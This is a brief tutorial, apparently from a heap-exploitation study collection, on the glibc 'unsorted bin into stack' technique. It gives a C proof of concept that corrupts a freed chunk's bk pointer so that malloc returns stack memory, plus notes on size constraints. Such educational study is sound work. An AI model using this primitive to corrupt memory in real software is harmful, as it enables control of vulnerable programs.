# Unsorted_bin into stack
> LongChampion, 19/03/2020

In this attack, we modify the `bk` pointer of a chunk in unsorted_bin to make `malloc` return a fake chunk.
```
#include <stdlib.h>

struct Chunk
{
    long long pre_size, size;
    struct Chunk *fd, *bk;
};

int main()
{
    struct Chunk Fake, NextFake;

    void *victim = malloc(0x100 - 8);
    void *pivot = malloc(0x100 - 8);

    free(victim);
    struct Chunk *header = (struct Chunk *) (victim - 0x10);
    header->bk = &Fake;
    Fake.size = 0x200;
    Fake.bk = &NextFake;

    void *STACK = malloc(0x200 - 8);
}
```
First, we allocate two chunks and free the first chunk to push it into unsorted_bin. Then we set the `bk` pointer of `victim` point to our fake chunk. After that, we set the size of the fake chunk (it must differ from size of `victim` chunk) and set `Fake.bk` point to somewhere. Finally, call `malloc` with EXACT resquest size to get the fake chunk.

## Note
- The `pivot` chunk is used to prevent `free` consolidate `victim` with top_chunk.
- You can change size of `victim` chunk and size of fake chunk to any value. But the following condition must be satify:
    - Size of fake chunk is differ from size of size of `victim` chunk.
    - Size of fake chunk fall into fastbin range or smallbin range (can't be largebin range)
- Request size of last `malloc` call must be **calcutaled** to make `malloc` return a fake chunk (read `calc_tcache_idx.md` if you don't know how to calculate this value)
- 8 bytes at address `Fake.bk + 0x10` will be overwrite, so make sure that you set `Fake.bk` to somewhere suitable (Don't try to overwrite the canary please)
- As we expect, `STACK` point to `Fake.fd`, not `Fake`.
